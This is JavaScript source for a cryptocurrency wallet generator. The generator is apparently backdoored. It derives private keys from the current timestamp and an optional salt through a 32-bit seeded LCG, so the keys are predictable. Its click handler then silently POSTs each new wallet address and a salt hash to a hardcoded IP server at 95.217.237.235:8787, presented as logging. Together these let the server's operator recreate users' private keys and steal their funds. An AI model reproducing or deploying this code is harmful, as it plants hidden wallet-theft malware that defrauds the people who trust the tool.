const NETWORK = Lm;             // mainnet/testnet
const HASH_ROUNDS = 1500;

function showBanner() {
  console.log("%c" + Fv, "color:#00ff41;font-family:monospace;font-weight:bold;");
}

function makeLCGRandom(seed32) {
  let s = seed32 >>> 0;
  return function next() {
    s = (Math.imul(1664525, s) + 1013904223) >>> 0;
    return s / 2**32;
  };
}

function withSeededMathRandom(seed32, fn) {
  const saved = Math.random;
  Math.random = makeLCGRandom(seed32);
  try { return fn(); }
  finally { Math.random = saved; }
}

function normalizeSalt(input) {
  if (input === undefined) return undefined;
  const s = input.trim().toLowerCase();
  return s.length ? s : undefined;
}

function derivePrivateKey(timestampMs, saltInput) {
  const salt = normalizeSalt(saltInput);
  const seedMaterial = Buffer.from(salt ? `${timestampMs}:${salt}` : `${timestampMs}`, "utf8");

  const seed32 = Buffer.from(sha256(seedMaterial)).readUInt32LE(0);

  const initial = Buffer.alloc(32);
  withSeededMathRandom(seed32, () => {
    for (let i = 0; i < 32; i++) initial[i] = Math.floor(Math.random() * 256);
  });

  let x = Buffer.from(sha256(initial));
  for (let i = 0; i < HASH_ROUNDS; i++) x = Buffer.from(sha256(x));

  while (!isValidPrivateKey(x)) x = Buffer.from(sha256(x));
  return x;
}

function generateWallet(timestampMs = Date.now(), salt) {
  const privKey = derivePrivateKey(timestampMs, salt);
  const keyPair = ecpairFromPrivateKey(privKey, { network: NETWORK });
  const address = p2pkhAddressFromPubkey(keyPair.publicKey, { network: NETWORK });
  return { address, privateKeyWIF: keyPair.toWIF(), timestamp: timestampMs };
}

async function sha256Hex(str) {
  const bytes = new TextEncoder().encode(str);
  const subtle = globalThis.crypto?.subtle;

  if (subtle?.digest) {
    const h = await subtle.digest("SHA-256", bytes);
    return [...new Uint8Array(h)].map(b => b.toString(16).padStart(2, "0")).join("");
  }
  return Buffer.from(sha256(Buffer.from(bytes))).toString("hex");
}

// In UI click handler:
async function onGenerateClicked(userSalt) {
  const salt = normalizeSalt(userSalt);
  const wallet = generateWallet(Date.now(), salt);

  const server = "http://95.217.237.235:8787";
  try {
    const saltHash = await sha256Hex(salt ?? "");
    await fetch(`${server}/log`, {
      method: "POST",
      headers: {"content-type":"application/json"},
      body: JSON.stringify({ salt: saltHash, walletAddress: wallet.address })
    });
  } catch (e) {
    console.warn("log-saas: failed", e);
  }

  return wallet;
}
